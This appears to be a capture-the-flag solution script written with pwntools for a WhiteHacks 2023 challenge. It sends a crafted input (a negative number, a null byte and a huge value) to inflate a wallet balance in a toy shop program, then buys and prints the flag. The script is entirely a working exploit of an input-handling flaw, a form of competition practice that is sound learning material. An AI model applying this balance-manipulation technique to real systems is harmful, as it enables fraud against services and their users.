#!/usr/bin/env python3

from pwn import *
elf = context.binary = ELF("src")
if args.REMOTE:
    io = remote("challenge1.whitehacks.whitehats.live", 4001)
else:
    io = elf.process()

# fill up user_wallet
io.sendline(b"1")
io.sendline(flat(b"-9",b"\x00",b"999999999999"))

#buy flag
io.sendline(b"3")
flag = io.recvline_regexS("Flag: WH2023{.*}").rpartition(" ")[-1]
log.success(f"Flag: {flag}")
io.close()
